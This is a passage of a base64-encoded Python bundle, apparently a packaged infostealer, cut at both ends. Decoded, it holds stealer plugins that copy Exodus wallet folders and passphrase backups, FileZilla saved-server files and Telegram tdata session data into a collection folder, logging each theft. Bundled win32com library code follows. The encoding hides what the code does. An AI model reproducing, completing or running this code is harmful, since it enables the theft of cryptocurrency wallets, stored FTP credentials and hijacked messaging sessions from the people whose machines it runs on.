qb2luKHdhbGxldHNfcGF0aCwgZlwnZXhvZHVzX3t0b2tlbl9oZXgoNCl9XCcpXHJcblxyXG4gICAgICAgIHdhbGxldF9mb2xkZXIgPSBqb2luKHBhdGgsIFwnZXhvZHVzLndhbGxldFwnKVxyXG4gICAgICAgIGlmIGlzZGlyKHdhbGxldF9mb2xkZXIpOlxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5dHJlZSh3YWxsZXRfZm9sZGVyLCBsb2dfZXhvZHVzX3BhdGgpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmXCdceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBleG9kdXMgXHhkMVx4ODEge3BhdGh9XCcpXHJcblxyXG4gICAgICAgIGJhY3VrcHNfZm9sZGVyID0gam9pbihwYXRoLCBcJ2JhY2t1cHNcJylcclxuICAgICAgICBmb3IgZGlycGF0aCwgZGlybmFtZXMsIGZpbGVuYW1lcyBpbiB3YWxrKGJhY3VrcHNfZm9sZGVyKTpcclxuICAgICAgICAgICAgZm9yIGYgaW4gZmlsZW5hbWVzOlxyXG4gICAgICAgICAgICAgICAgaWYgZiA9PSAicGFzc3BocmFzZS5qc29uIjpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIobG9nX2V4b2R1c19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgbWtkaXIobG9nX2V4b2R1c19wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4oZGlycGF0aCwgZiksIGpvaW4obG9nX2V4b2R1c19wYXRoLCBmXCdwYXNzcGhyYXNlX3t0b2tlbl9oZXgoNCl9Lmpzb25cJykpJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BsdWdpbnMvZmlsZXppbGxhLnB5JywgYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRmlsZXppbGxhKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWFyY2ggPSB7J3JlY2VudHNlcnZlcnMueG1sJywgJ3NpdGVtYW5hZ2VyLnhtbCd9XHJcbiAgICAgICAgZmlsZXMgPSBzZWFyY2guaW50ZXJzZWN0aW9uKGkubmFtZSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKVxyXG5cclxuICAgICAgICBpZiBub3QgZmlsZXM6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnZmlsZXppbGxhJylcclxuICAgICAgICBpZiBub3QgaXNkaXIocmVzX3BhdGgpOlxyXG4gICAgICAgICAgICBta2RpcihyZXNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBmb3IgZiBpbiBmaWxlczpcclxuICAgICAgICAgICAgZmlsZW5hbWUgPSBmLnNwbGl0KCcuJylbMF1cclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZid7ZmlsZW5hbWV9X3t0b2tlbl9oZXgoNCl9LnhtbCcpXHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4ocGF0aCwgZiksIGRlc3RfcGF0aClcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidGaWxlemlsbGEgc3RlYWxlZCBmcm9tIHtwYXRofScpIikKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BsdWdpbnMvdGVsZWdyYW0ucHknLCBiJ2Zyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pbiwgbm9ybXBhdGhcclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGUsIGNvcHl0cmVlXHJcbmltcG9ydCB3aW5yZWdcclxuaW1wb3J0IHJlXHJcbmZyb20gcGF0aHMgaW1wb3J0IExPQ0FMXHJcbmltcG9ydCB3aW4zMmNvbS5jbGllbnRcclxuaW1wb3J0IHBzdXRpbFxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IHNwbGl0XHJcblxyXG5cclxuXHJcbmNsYXNzIFRlbGVncmFtKFBsdWdpbik6XHJcbiAgICBTVEVBTEVEID0gc2V0KClcclxuXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBwYXRoXyA9IG5vcm1wYXRoKHBhdGgubG93ZXIoKSlcclxuICAgICAgICBpZiBwYXRoXyBpbiBUZWxlZ3JhbS5TVEVBTEVEOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBUZWxlZ3JhbS5TVEVBTEVELmFkZChwYXRoXylcclxuICAgICAgICBcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZGF0YV9wYXRoID0gam9pbihwYXRoLCBcJ3RkYXRhXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHRkYXRhX3BhdGgpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgdGVsZWdyYW1fcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCBcJ3RlbGVncmFtXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHRlbGVncmFtX3BhdGgpOlxyXG4gICAgICAgICAgICBta2Rpcih0ZWxlZ3JhbV9wYXRoKVxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4odGVsZWdyYW1fcGF0aCwgZlwndGRhdGFfe3Rva2VuX2hleCg0KX1cJylcclxuICAgICAgICBta2RpcihyZXNfcGF0aClcclxuXHJcbiAgICAgICAgYmxhY2tsaXN0ID0gW1wnZHVtcHNcJywgXCdlbW9qaVwnLCBcJ3VzZXJfZGF0YVwnLCBcJ3dvcmtpbmdcJ11cclxuXHJcbiAgICAgICAgZm9yIGYgaW4gc2NhbmRpcih0ZGF0YV9wYXRoKTpcclxuICAgICAgICAgICAgZmlsZV9vayA9IFRydWVcclxuICAgICAgICAgICAgZm9yIGkgaW4gYmxhY2tsaXN0OlxyXG4gICAgICAgICAgICAgICAgaWYgaSBpbiBmLm5hbWU6XHJcbiAgICAgICAgICAgICAgICAgICAgZmlsZV9vayA9IEZhbHNlXHJcbiAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGlmIG5vdCBmaWxlX29rOlxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgXHJcbiAgICAgICAgICAgIGZyb21fcGF0aCA9IGpvaW4odGRhdGFfcGF0aCwgZi5uYW1lKVxyXG4gICAgICAgICAgICBkZXN0X3BhdGggPSBqb2luKHJlc19wYXRoLCBmLm5hbWUpXHJcblxyXG4gICAgICAgICAgICBmdW5jID0gY29weWZpbGUgaWYgZi5pc19maWxlKCkgZWxzZSBjb3B5dHJlZVxyXG4gICAgICAgICAgICBhd2FpdCBmdW5jKGZyb21fcGF0aCwgZGVzdF9wYXRoKVxyXG5cclxuICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmXCdUZWxlZ3JhbSBzdGVhbGVkIGZyb20ge3BhdGh9XCcpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9yZWdpc3RyeV9wYXRoKCk6XHJcbiAgICAgICAgcGF0aCA9IHdpbnJlZy5IS0VZX0NMQVNTRVNfUk9PVFxyXG5cclxuICAgICAgICB0ZyA9IHdpbnJlZy5PcGVuS2V5RXgocGF0aCwgciJ0ZGVza3RvcC50Z1xcXFwiKVxyXG4gICAgICAgIHNoZWxsID0gd2lucmVnLk9wZW5LZXlFeCh0Zywgclwnc2hlbGxcXFxcXCcpXHJcbiAgICAgICAgb3Blbl9yZyA9IHdpbnJlZy5PcGVuS2V5RXgoc2hlbGwsIHJcJ29wZW5cXFxcXCcpXHJcbiAgICAgICAga2V5ID0gd2lucmVnLk9wZW5LZXlFeChvcGVuX3JnLCByXCdjb21tYW5kXFxcXFwnKVxyXG5cclxuICAgICAgICB2YWx1ZSA9IHdpbnJlZy5FbnVtVmFsdWUoa2V5LCAwKVxyXG5cclxuICAgICAgICBwYXRoID0gcmUuZmluZGFsbChyXCciKFteIl0qKVwnLCB2YWx1ZVsxXSlbMl1cclxuICAgICAgICByZXR1cm4gcGF0aFxyXG4gICAgICAgIFxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGdldF9sbmtfcGF0aCgpOlxyXG4gICAgICAgIGRlc2t0b3AgPSBqb2luKExPQ0FMLCBcJ2Rlc2t0b3BcJylcclxuXHJcbiAgICAgICAgZm9yIGl0IGluIHNjYW5kaXIoZGVza3RvcCk6XHJcbiAgICAgICAgICAgIGlmIGl0Lm5hbWUuc3BsaXQoXCcuXCcpWy0xXSA9PSBcJ2xua1wnIGFuZCBcJ3RlbGVncmFtXCcgaW4gaXQubmFtZS5sb3dlcigpOlxyXG4gICAgICAgICAgICAgICAgc2hlbGwgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2goIldTY3JpcHQuU2hlbGwiKVxyXG4gICAgICAgICAgICAgICAgc2hvcnRjdXQgPSBzaGVsbC5DcmVhdGVTaG9ydEN1dChpdC5wYXRoKVxyXG4gICAgICAgICAgICAgICAgcGF0aCA9IHNob3J0Y3V0LlRhcmdldHBhdGgubG93ZXIoKS5zdHJpcChcJ3RlbGVncmFtLmV4ZVwnKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIHBhdGhcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X3RlbGVncmFtcygpOlxyXG4gICAgICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoKTpcclxuICAgICAgICAgICAgaWYgXCd0ZWxlZ3JhbVwnIGluIHByb2MubmFtZSgpLmxvd2VyKCk6XHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgeWllbGQgc3BsaXQocHJvYy5leGUoKSlbMF1cclxuICAgICAgICAgICAgICAgIGV4Y2VwdDpcclxuICAgICAgICAgICAgICAgICAgICBwYXNzJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3dpbjMyY29tL19faW5pdF9fLnB5JywgYicjXG4jIEluaXRpYWxpemF0aW9uIGZvciB0aGUgd2luMzJjb20gcGFja2FnZVxuI1xuXG5pbXBvcnQgd2luMzJhcGksIHN5cywgb3NcbmltcG9ydCBweXRob25jb21cblxuIyBmbGFnIGlmIHdlIGFyZSBpbiBhICJmcm96ZW4iIGJ1aWxkLlxuX2Zyb3plbiA9IGdldGF0dHIoc3lzLCAiZnJvemVuIiwgMSA9PSAwKVxuIyBweXRob25jb20gZHVtYmx5IGRlZmF1bHRzIHRoaXMgdG8gemVybyAtIHdlIGJlbGlldmUgc3lzLmZyb3plbiBvdmVyIGl0LlxuaWYgX2Zyb3plbiBhbmQgbm90IGdldGF0dHIocHl0aG9uY29tLCAiZnJvemVuIiwgMCk6XG4gICAgcHl0aG9uY29tLmZyb3plbiA9IHN5cy5mcm96ZW5cblxuIyBBZGQgc3VwcG9ydCBmb3IgYW4gZXh0ZXJuYWwgIkNPTSBFeHRlbnNpb25zIiBwYXRoLlxuIyAgQ29uY2VwdCBpcyB0aGF0IHlvdSBjYW4gcmVnaXN0ZXIgYSBzZXBlcmF0ZSBwYXRoIHRvIGJlIHVzZWQgZm9yXG4jICBDT00gZXh0ZW5zaW9ucywgb3V0c2lkZSBvZiB0aGUgd2luMzJjb20gZGlyZWN0b3J5LiAgVGhlc2UgbW9kdWxlcywgaG93ZXZlcixcbiMgIGxvb2sgaWRlbnRpY2FsIHRvIHdpbjMyY29tIGJ1aWx0LWluIG1vZHVsZXMuXG4jICBUaGlzIGlzIHRoZSB0ZWNobmlxdWUgdGhhdCB3ZSB1c2UgZm9yIHRoZSAic3RhbmRhcmQiIENPTSBleHRlbnNpb25zLlxuIyAgZWcgIndpbjMyY29tLm1hcGkiIG9yICJ3aW4zMmNvbS5heHNjcmlwdCIgYm90aCB3b3JrLCBldmVuIHRob3VnaCB0aGV5IGRvIG5vdFxuIyAgbGl2ZSB1bmRlciB0aGUgbWFpbiB3aW4zMmNvbSBkaXJlY3RvcnkuXG5fX2dlbl9wYXRoX18gPSAiIlxuX19idWlsZF9wYXRoX18gPSBOb25lXG4jIyMgVE9ETyAtIExvYWQgX2FsbF8gXFxcXEV4dGVuc2lvbnMgc3Via2V5cyAtIGZvciBub3csIHdlIG9ubHkgcmVhZCB0aGUgZGVmYXVsdFxuIyMjIE1vZHVsZXMgd2lsbCB3b3JrIGlmIGxvYWRlZCBpbnRvICJ3aW4zMmNvbWV4dCIgcGF0aC5cblxuXG5kZWYgU2V0dXBFbnZpcm9ubWVudCgpOlxuICAgIEhLRVlfTE9DQUxfTUFDSElORSA9IC0yMTQ3NDgzNjQ2ICAjIEF2b2lkIHB1bGxpbmcgaW4gd2luMzJjb24gZm9yIGp1c3QgdGhlc2UuLi5cbiAgICBLRVlfUVVFUllfVkFMVUUgPSAweDFcbiAgICAjIE9wZW4gdGhlIHJvb3Qga2V5IG9uY2UsIGFzIHRoaXMgaXMgcXVpdGUgc2xvdyBvbiBOVC5cbiAgICB0cnk6XG4gICAgICAgIGtleU5hbWUgPSAiU09GVFdBUkVcXFxcUHl0aG9uXFxcXFB5dGhvbkNvcmVcXFxcJXNcXFxcUHl0aG9uUGF0aFxcXFx3aW4zMmNvbSIgJSBzeXMud2ludmVyXG4gICAgICAgIGtleSA9IHdpbjMyYXBpLlJlZ09wZW5LZXkoSEtFWV9MT0NBTF9NQUNISU5FLCBrZXlOYW1lLCAwLCBLRVlfUVVFUllfVkFMVUUpXG4gICAgZXhjZXB0ICh3aW4zMmFwaS5lcnJvciwgQXR0cmlidXRlRXJyb3IpOlxuICAgICAgICBrZXkgPSBOb25lXG5cbiAgICB0cnk6XG4gICAgICAgIGZvdW5kID0gMFxuICAgICAgICBpZiBrZXkgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgX19wYXRoX18uYXBwZW5kKHdpbjMyYXBpLlJlZ1F1ZXJ5VmFsdWUoa2V5LCAiRXh0ZW5zaW9ucyIpKVxuICAgICAgICAgICAgICAgIGZvdW5kID0gMVxuICAgICAgICAgICAgZXhjZXB0IHdpbjMyYXBpLmVycm9yOlxuICAgICAgICAgICAgICAgICMgTm90aGluZyByZWdpc3RlcmVkXG4gICAgICAgICAgICAgICAgcGFzc1xuICAgICAgICBpZiBub3QgZm91bmQ6XG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgX19wYXRoX18uYXBwZW5kKFxuICAgICAgICAgICAgICAgICAgICB3aW4zMmFwaS5HZXRGdWxsUGF0aE5hbWUoX19wYXRoX19bMF0gKyAiXFxcXC4uXFxcXHdpbjMyY29tZXh0IilcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICBleGNlcHQgd2luMzJhcGkuZXJyb3I6XG4gICAgICAgICAgICAgICAgIyBHaXZlIHVwIGluIGRpc2d1c3QhXG4gICAgICAgICAgICAgICAgcGFzc1xuXG4gICAgICAgICMgRm9yIHRoZSBzYWtlIG9mIGRldmVsb3BlcnMsIHdlIGFsc28gbG9vayB1cCBhICJCdWlsZFBhdGgiIGtleVxuICAgICAgICAjIElmIGV4dGVuc2lvbiBtb2R1bGVzIGFkZCBzdXBwb3J0LCB3ZSBjYW4gbG9hZCB0aGVpciAucHlkXCdzIGZyb20gYSBjb21wbGV0ZWx5XG4gICAgICAgICMgZGlmZmVyZW50IGRpcmVjdG9yeSAoc2VlIHRoZSBjb21tZW50cyBiZWxvdylcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgaWYga2V5IGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgICAgIGdsb2JhbCBfX2J1aWxkX3BhdGhfX1xuICAgICAgICAgICAgICAgIF9fYnVpbGRfcGF0aF9fID0gd2luMzJhcGkuUmVnUXVlcnlWYWx1ZShrZXksICJCdWlsZFBhdGgiKVxuICAgICAgICAgICAgICAgIF9fcGF0aF9fLmFwcGVuZChfX2J1aWxkX3BhdGhfXylcbiAgICAgICAgZXhjZXB0IHdpbjMyYXBpLmVycm9yOlxuICAgICAgICAgICAgIyBfX2J1aWxkX3BhdGhfXyBuZWVkbnQgYmUgZGVmaW5lZC5cbiAgICAgICAgICAgIHBhc3NcbiAgICAgICAgZ2xvYmFsIF9fZ2VuX3BhdGhfX1xuICAgICAgICBpZiBrZXkgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgX19nZW5fcGF0aF9fID0gd2luMzJhcGkuUmVnUXVlcnlWYWx1ZShrZXksICJHZW5QYXRoIilcbiAgICAgICAgICAgIGV4Y2VwdCB3aW4zMmFwaS5lcnJvcjpcbiAgICAgICAgICAgICAgICBwYXNzXG4gICAgZmluYWxseTpcbiAgICAgICAgaWYga2V5IGlzIG5vdCBOb25lOlxuICAgICAgICAgICAga2V5LkNsb3NlKClcblxuXG4jIEEgSGVscGVyIGZvciBkZXZlbG9wZXJzLiAgQSBzdWItcGFja2FnZVwncyBfX2luaXRfXyBjYW4gY2FsbCB0aGlzIGhlbHAgZnVuY3Rpb24sXG4jIHdoaWNoIGFsbG93cyB0aGUgLnB5ZCBmaWxlcyBmb3IgdGhlIGV4dGVuc2lvbiB0byBsaXZlIGluIGEgc3BlY2lhbCAiQnVpbGQiIGRpcmVjdG9yeVxuIyAod2hpY2ggdGhlIHdpbjMyY29tIGRldmVsb3BlcnMgZG8hKVxuZGVmIF9fUGFja2FnZVN1cHBvcnRCdWlsZFBhdGhfXyhwYWNrYWdlX3BhdGgpOlxuICAgICMgU2VlIGlmIHdlIGhhdmUgYSBzcGVjaWFsIGRpcmVjdG9yeSBmb3IgdGhlIGJpbmFyaWVzIChmb3IgZGV2ZWxvcGVycylcbiAgICBpZiBub3QgX2Zyb3plbiBhbmQgX19idWlsZF9wYXRoX186XG4gICAgICAgIHBhY2thZ2VfcGF0aC5hcHBlbmQoX19idWlsZF9wYXRoX18pXG5cblxuaWYgbm90IF9mcm96ZW46XG4gICAgU2V0dXBFbnZpcm9ubWVudCgpXG5cbiMgSWYgd2UgZG9uXCd0IGhhdmUgYSBzcGVjaWFsIF9fZ2VuX3BhdGhfXywgc2VlIGlmIHdlIGhhdmUgYSBnZW5fcHkgYXMgYVxuIyBub3JtYWwgbW9kdWxlIGFuZCB1c2UgdGhhdCAoaWUsICJ3aW4zMmNvbS5nZW5fcHkiIG1heSBhbHJlYWR5IGV4aXN0IGFzXG4jIGEgcGFja2FnZS5cbmlmIG5vdCBfX2dlbl9wYXRoX186XG4gICAgdHJ5OlxuICAgICAgICBpbXBvcnQgd2luMzJjb20uZ2VuX3B5XG5cbiAgICAgICAgIyBocm1waCAtIDMuMyB0aHJvd3M6IFR5cGVFcnJvcjogXCdfTmFtZXNwYWNlUGF0aFwnIG9iamVjdCBkb2VzIG5vdCBzdXBwb3J0IGluZGV4aW5nXG4gICAgICAgICMgYXR0ZW1wdGluZyB0byBnZXQgX19wYXRoX19bMF0gLSBidXQgSSBjYW5cJ3QgcXVpY2tseSByZXBybyB0aGlzIHN0YW5kLWFsb25lLlxuICAgICAgICAjIFdvcmsgYXJvdW5kIGl0IGJ5IHVzaW5nIGFuIGl0ZXJhdG9yLlxuICAgICAgICBfX2dlbl9wYXRoX18gPSBuZXh0KGl0ZXIoc3lzLm1vZHVsZXNbIndpbjMyY29tLmdlbl9weSJdLl9fcGF0aF9fKSlcbiAgICBleGNlcHQgSW1wb3J0RXJyb3I6XG4gICAgICAgICMgSWYgYSB3aW4zMmNvbVxcZ2VuX3B5IGRpcmVjdG9yeSBhbHJlYWR5IGV4aXN0cywgdGhlbiB3ZSB1c2UgaXRcbiAgICAgICAgIyAoZ2VuY2FjaGUgZG9lc25cJ3QgaW5zaXN0IGl0IGhhdmUgYW4gX19pbml0X18sIGJ1dCBvdXIgX19pbXBvcnRfX1xuICAgICAgICAjIGFib3ZlIGRvZXMhXG4gICAgICAgIF9fZ2VuX3BhdGhfXyA9IG9zLnBhdGguYWJzcGF0aChvcy5wYXRoLmpvaW4oX19wYXRoX19bMF0sICJnZW5fcHkiKSlcbiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIoX19nZW5fcGF0aF9fKTpcbiAgICAgICAgICAgICMgV2UgdXNlZCB0byBkeW5hbWljYWxseSBjcmVhdGUgYSBkaXJlY3RvcnkgdW5kZXIgd2luMzJjb20gLVxuICAgICAgICAgICAgIyBidXQgdGhpcyBzdWNrcy4gIElmIHRoZSBkaXIgZG9lc25cJ3QgYWxyZWFkeSBleGlzdCwgd2Ugd2VcbiAgICAgICAgICAgICMgY3JlYXRlIGEgdmVyc2lvbiBzcGVjaWZpYyBkaXJlY3RvcnkgdW5kZXIgdGhlIHVzZXIgdGVtcFxuICAgICAgICAgICAgIyBkaXJlY3RvcnkuXG4gICAgICAgICAgICBfX2dlbl9wYXRoX18gPSBvcy5wYXRoLmpvaW4oXG4gICAgICAgICAgICAgICAgd2luMzJhcGkuR2V0VGVtcFBhdGgoKSxcbiAgICAgICAgICAgICAgICAiZ2VuX3B5IixcbiAgICAgICAgICAgICAgICAiJWQuJWQiICUgKHN5cy52ZXJzaW9uX2luZm9bMF0sIHN5cy52ZXJzaW9uX2luZm9bMV0pLFxuICAgICAgICAgICAgKVxuXG4jIHdlIG11c3QgaGF2ZSBhIF9fZ2VuX3BhdGhfXywgYnV0IG1heSBub3QgaGF2ZSBhIGdlbl9weSBtb2R1bGUgLVxuIyBzZXQgdGhhdCB1cC5cbmlmICJ3aW4zMmNvbS5nZW5fcHkiIG5vdCBpbiBzeXMubW9kdWxlczpcbiAgICAjIENyZWF0ZSBhICJ3aW4zMmNvbS5nZW5fcHkiLCBidXQgd2l0aCBhIGN1c3RvbSBfX3BhdGhfX1xuICAgIGltcG9ydCB0eXBlc1xuXG4gICAgZ2VuX3B5ID0gdHlwZXMuTW9kdWxlVHlwZSgid2luMzJjb20uZ2VuX3B5IilcbiAgICBnZW5fcHkuX19wYXRoX18gPSBbX19nZW5fcGF0aF9fXVxuICAgIHN5cy5tb2R1bGVzW2dlbl9weS5fX25hbWVfX10gPSBnZW5fcHlcbiAgICBkZWwgdHlwZXNcbmdlbl9weSA9IHN5cy5tb2R1bGVzWyJ3aW4zMmNvbS5nZW5fcHkiXVxuXG4jIGdldCByaWQgb2YgdGhlc2UgZm9yIG1vZHVsZSB1c2Vyc1xuZGVsIG9zLCBzeXMsIHdpbjMyYXBpLCBweXRob25jb21cbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdweXRob25jb20ucHknLCBiJyMgTWFnaWMgdXRpbGl0eSB0aGF0ICJyZWRpcmVjdHMiIHRvIHB5dGhvbmNvbXh4LmRsbFxuaW1wb3J0IHB5d2ludHlwZXNcblxucHl3aW50eXBlcy5fX2ltcG9ydF9weXdpbjMyX3N5c3RlbV9tb2R1bGVfXygicHl0aG9uY29tIiwgZ2xvYmFscygpKVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3dpbjMyY29tL2NsaWVudC9fX2luaXRfXy5weScsIGInIyBUaGlzIG1vZHVsZSBleGlzdHMgdG8gY3JlYXRlIHRoZSAiYmVzdCIgZGlzcGF0Y2ggb2JqZWN0IGZvciBhIGdpdmVuXG4jIG9iamVjdC4gIElmICJtYWtlcHkiIHN1cHBvcnQgZm9yIGEgZ2l2ZW4gb2JqZWN0IGlzIGRldGVjdGVkLCBpdCBpc1xuIyB1c2VkLCBvdGhlcndpc2UgYSBkeW5hbWljIGRpc3BhdGNoIG9iamVjdC5cblxuIyBOb3RlIHRoYXQgaWYgdGhlIHVua25vd24gZGlzcGF0Y2ggb2JqZWN0IHRoZW4gcmV0dXJucyBhIGtub3duXG4jIGRpc3BhdGNoIG9iamVjdCwgdGhlIGtub3duIGNsYXNzIHdpbGwgYmUgdXNlZC4gIFRoaXMgY29udHJhc3RzXG4jIHdpdGggZHluYW1pYy5EaXNwYXRjaCBiZWhhdmlvdXIsIHdoZXJlIGR5bmFtaWMgb2JqZWN0cyBhcmUgYWx3YXlzIHVzZWQuXG5cbmltcG9ydCBweXRob25jb21cbmZyb20gLiBpbXBvcnQgZHluYW1pY1xuZnJvbSAuIGltcG9ydCBnZW5jYWNoZVxuaW1wb3J0IHN5c1xuaW1wb3J0IHB5d2ludHlwZXNcblxuX1B5SURpc3BhdGNoVHlwZSA9IHB5dGhvbmNvbS5UeXBlSUlEc1tweXRob25jb20uSUlEX0lEaXNwYXRjaF1cblxuXG5kZWYgX19XcmFwRGlzcGF0Y2goXG4gICAgZGlzcGF0Y2gsXG4gICAgdXNlck5hbWU9Tm9uZSxcbiAgICByZXN1bHRDTFNJRD1Ob25lLFxuICAgIHR5cGVpbmZvPU5vbmUsXG4gICAgVW5pY29kZVRvU3RyaW5nPU5vbmUsXG4gICAgY2xzY3R4PXB5dGhvbmNvbS5DTFNDVFhfU0VSVkVSLFxuICAgIFdyYXBwZXJDbGFzcz1Ob25lLFxuKTpcbiAgICAiIiJcbiAgICBIZWxwZXIgZnVuY3Rpb24gdG8gcmV0dXJuIGEgbWFrZXB5IGdlbmVyYXRlZCBjbGFzcyBmb3IgYSBDTFNJRCBpZiBpdCBleGlzdHMsXG4gICAgb3RoZXJ3aXNlIGNvcGUgYnkgdXNpbmcgQ0Rpc3BhdGNoLlxuICAgICIiIlxuICAgIGFzc2VydCBVbmljb2RlVG9TdHJpbmcgaXMgTm9uZSwgInRoaXMgaXMgZGVwcmVjYXRlZCBhbmQgd2lsbCBnbyBhd2F5IlxuICAgIGlmIHJlc3VsdENMU0lEIGlzIE5vbmU6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIHR5cGVpbmZvID0gZGlzcGF0Y2guR2V0VHlwZUluZm8oKVxuICAgICAgICAgICAgaWYgKFxuICAgICAgICAgICAgICAgIHR5cGVpbmZvIGlzIG5vdCBOb25lXG4gICAgICAgICAgICApOiAgIyBTb21lIG9iamVjdHMgcmV0dXJuIE5VTEwsIHNvbWUgcmFpc2UgZXhjZXB0aW9ucy4uLlxuICAgICAgICAgICAgICAgIHJlc3VsdENMU0lEID0gc3RyKHR5cGVpbmZvLkdldFR5cGVBdHRyKClbMF0pXG4gICAgICAgIGV4Y2VwdCAocHl0aG9uY29tLmNvbV9lcnJvciwgQXR0cmlidXRlRXJyb3IpOlxuICAgICAgICAgICAgcGFzc1xuICAgIGlmIHJlc3VsdENMU0lEIGlzIG5vdCBOb25lOlxuICAgICAgICBmcm9tIC4gaW1wb3J0IGdlbmNhY2hlXG5cbiAgICAgICAgIyBBdHRlbXB0IHRvIGxvYWQgZ2VuZXJhdGVkIG1vZHVsZSBzdXBwb3J0XG4gICAgICAgICMgVGhpcyBtYXkgbG9hZCB0aGUgbW9kdWxlLCBhbmQgbWFrZSBpdCBhdmFpbGFibGVcbiAgICAgICAga2xhc3MgPSBnZW5jYWNoZS5HZXRDbGFzc0ZvckNMU0lEKHJlc3VsdENMU0lEKVxuICAgICAgICBpZiBrbGFzcyBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHJldHVybiBrbGFzcyhkaXNwYXRjaClcblxuICAgICMgUmV0dXJuIGEgImR5bmFtaWMiIG9iamVjdCAtIGJlc3Qgd2UgY2FuIGRvIVxuICAgIGlmIFdyYXBwZXJDbGFzcyBpcyBOb25lOlxuICAgICAgICBXcmFwcGVyQ2xhc3MgPSBDRGlzcGF0Y2hcbiAgICByZXR1cm4gZHluYW1pYy5EaXNwYXRjaChkaXNwYXRjaCwgdXNlck5hbWUsIFdyYXBwZXJDbGFzcywgdHlwZWluZ